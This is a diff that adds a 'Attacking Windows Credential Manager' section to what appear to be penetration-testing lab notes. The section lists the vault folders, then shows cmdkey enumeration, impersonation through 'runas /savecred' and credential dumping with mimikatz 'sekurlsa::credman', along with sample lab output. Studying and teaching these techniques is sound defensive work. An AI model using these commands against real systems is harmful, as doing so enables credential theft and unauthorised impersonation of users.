@@ -85,6 +85,9 @@
         - [Rundll32.exe \& Comsvcs.dll Method](#rundll32exe--comsvcsdll-method)
       - [Using Pypykatz to extract Credentials](#using-pypykatz-to-extract-credentials)
       - [Cracking the NT Hash with Hashcat](#cracking-the-nt-hash-with-hashcat)
+    - [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
+      - [Enumerating Credentials with cmdkey](#enumerating-credentials-with-cmdkey)
+      - [Extracting Credentials with Mimikatz](#extracting-credentials-with-mimikatz)
 
 ---
 
@@ -1892,3 +1895,106 @@ d41y@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share
 
 64f12cddaa88057e06a81b54e73b949b:Password1
 ```
+
+### Attacking Windows Credential Manager
+
+Credential Manager is a feature built into Windows Server 2008 R2 and Windows 7. Thorough documentation on how it works is not publicly available, but essentially, it allows users and applications to securely store credentials relevant to other systems and websites. Credentials are stored in special encrypted folders on the computer under the user and system profiles:
+
+- ```%UserProfile%\AppData\Local\Microsoft\Vault\```
+- ```%UserProfile%\AppData\Local\Microsoft\Credentials\```
+- ```%UserProfile%\AppData\Roaming\Microsoft\Vault\```
+- ```%ProgramData%\Microsoft\Vault\```
+- ```%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\```
+
+Each vault folder contains a ```Policy.pol``` file with AES keys that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys storing them in secured memory enclaves.
+
+Microsoft often refers to the protected stores as Credential Lockers. Credenial Manager is the user-facing feature/API, while the actual encrypted stores are the vault/locker folders. The following table lists the two types of credentials Windows stores:
+
+| Name | Description |
+| ---- | ----------- |
+| Web Credentials | credentials associated with websites and online accounts; this locker is used by Internet Explorer and legacy versions if Microsoft Edge |
+| Windows Credentials | used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories |
+
+It is possible to export Windows Vaults to ```.crd``` files either via Control Panel or with the following command. Backups created this way are encrypted with a password supplied by the user, and can be imported on other Windows systems.
+
+```
+C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
+```
+
+#### Enumerating Credentials with cmdkey
+
+You can use cmdkey to enumerate the credentials stored in the current user's profile:
+
+```
+C:\Users\sadams>whoami
+srv01\sadams
+
+C:\Users\sadams>cmdkey /list
+
+Currently stored credentials:
+
+    Target: WindowsLive:target=virtualapp/didlogical
+    Type: Generic
+    User: 02hejubrtyqjrkfi
+    Local machine persistence
+
+    Target: Domain:interactive=SRV01\mcharles
+    Type: Domain Password
+    User: SRV01\mcharles
+```
+
+Stored credentials are listed with the following format:
+
+| Key | Value |
+| --- | ----- |
+| Target | the resource or account name the credential is for; this could be a computer, domain name, or a special identifier |
+| Type | the kind of credential; common types are Generic for general credentials, and Domain Password for domain user logons |
+| User | the user account associated with the credential |
+| Persistence | some credentials indicate whether a credential is saved persistently on the computer; credentials marked with "Local machine persistence" survive reboots |
+
+The first credential in the command output above (```virtualapp/didlogical```) is a generic credential used by Microsoft account / Windows Live services. The random looking username is an internal account ID. This entry may be ignored for your purposes.
+
+The second credential (```Domain:interactive=SRV01\mcharles```) is a domain credential associated with the user SRV01\mcharles. Interactive means that the credential is used for interactive logon sessions. Whenever you come across this type of credential, you can use ```runas``` to impersonate the stored user like so:
+
+```
+C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
+Attempting to start cmd as user "SRV01\mcharles" ...
+```
+
+#### Extracting Credentials with Mimikatz
+
+There are many different tools that can be used to decrypt stored credentials. One of the tools you can use is mimikatz. Even within mimikatz, there are multiple ways to attack these credentials - you can either dump credentials from memory using the ```sekurlsa``` module, or you can manually decrypt credentials using the ```dpapi``` module.
+
+```
+C:\Users\Administrator\Desktop> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::credman
+
+...SNIP...
+
+Authentication Id : 0 ; 630472 (00000000:00099ec8)
+Session           : RemoteInteractive from 3
+User Name         : mcharles
+Domain            : SRV01
+Logon Server      : SRV01
+Logon Time        : 4/27/2025 2:40:32 AM
+SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
+        credman :
+         [00000000]
+         * Username : mcharles@inlanefreight.local
+         * Domain   : onedrive.live.com
+         * Password : ...SNIP...
+
+...SNIP...
+```
+
